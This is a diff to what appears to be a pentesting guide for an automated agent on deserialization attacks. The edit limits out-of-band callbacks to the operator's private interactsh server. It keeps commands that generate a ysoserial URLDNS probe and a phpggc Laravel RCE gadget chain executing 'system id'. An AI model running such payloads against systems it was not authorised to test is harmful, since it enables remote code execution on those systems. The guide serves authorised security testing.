@@ -190,7 +190,7 @@ When `TypeNameHandling` != `None`.
 
 ## Tooling
 
-Payload generation is the practitioner's core tool here. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST); add a JRE or `php-cli` if you need the Java/PHP generators.
+Payload generation is the practitioner's core tool here. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST, only against the operator's private server in `$STRIX_OAST_SERVER`, never the public `oast.*` defaults); add a JRE or `php-cli` if you need the Java/PHP generators.
 
 | Tool | Language / format | Use |
 |------|-------------------|-----|
@@ -201,7 +201,8 @@ Payload generation is the practitioner's core tool here. The sandbox has `git`/`
 
 ```
 # Java: prove the sink with a no-exec DNS oracle BEFORE any RCE chain
-java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0
+# (requires $STRIX_OAST_SERVER; mint <callback-domain> with interactsh-client -server "$STRIX_OAST_SERVER")
+java -jar ysoserial.jar URLDNS "http://strix-deser-01.<callback-domain>" | base64 -w0
 
 # PHP: generate a Laravel POP chain (base64), fast path via a framework gadget
 ./phpggc -b Laravel/RCE9 system id
